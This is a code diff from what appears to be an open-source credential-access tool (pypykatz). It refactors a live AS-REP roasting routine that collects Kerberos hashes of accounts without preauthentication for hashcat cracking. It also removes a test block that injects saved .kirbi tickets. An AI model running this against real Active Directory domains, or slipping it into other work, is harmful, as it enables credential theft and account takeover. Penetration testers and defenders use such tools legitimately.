@@ -4,11 +4,10 @@ import datetime
 from winacl.functions.highlevel import get_logon_info
 from msldap.commons.factory import LDAPConnectionFactory
 from pypykatz.kerberos.functiondefs.asn1structs import InitialContextToken
-from minikerberos.common.utils import TGSTicket2hashcat, TGTTicket2hashcat
-from minikerberos.network.clientsocket import KerberosClientSocket
+from minikerberos.common.utils import TGSTicket2hashcat
 from minikerberos.common.target import KerberosTarget
 
-from minikerberos.security import APREPRoast, Kerberoast
+from minikerberos.security import asreproast
 from minikerberos.common.creds import KerberosCredential
 from minikerberos.common.target import KerberosTarget
 from minikerberos.common.utils import TGSTicket2hashcat
@@ -322,12 +321,14 @@ async def live_roast(outfile = None):
 			
 			spn_users.append(cred)
 			
-		for cred in asrep_users:
-			results = []
-			ks = KerberosTarget(domain)
-			ar = APREPRoast(ks)
-			res = await ar.run(cred, override_etype = [23])
-			results.append(res)	
+		asrepusernames = [x.username for x in asrep_users]
+		asrepdomain = asrep_users[0].domain
+		async for username, h, err in asreproast(KerberosTarget(domain), asrepdomain, asrepusernames, override_etype = [23]):
+			if err is not None:
+				errors.append((username,err))
+			else:
+				asrep_cnt += 1
+				results.append(str(h))
 		
 		if outfile is not None:
 			filename = outfile + 'asreproast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
@@ -377,30 +378,3 @@ async def live_roast(outfile = None):
 	except Exception as e:
 		return None, None, e
 
-
-if __name__ == '__main__':
-	import glob
-	import sys
-
-	kl = KerberosLive()
-	kl.purge(0)
-	#x = kl.get_all_ticketdata()
-	#ctr = 0
-	#for luid in x:
-	#	if x[luid] != []:
-	#		for ticket in x[luid]:
-	#			ctr += 1
-	#			with open('test_%s.kirbi' % ctr, 'wb') as f:
-	#				f.write(ticket['Ticket'])
-	#
-	#print(x)
-	#sys.exit()
-	for filename in glob.glob('*.kirbi'):
-		with open(filename, 'rb') as d:
-			ticket = d.read()
-			try:
-				kl.submit_ticket(ticket)
-				print('OK')
-			except Exception as e:
-				print(e)
-			input()
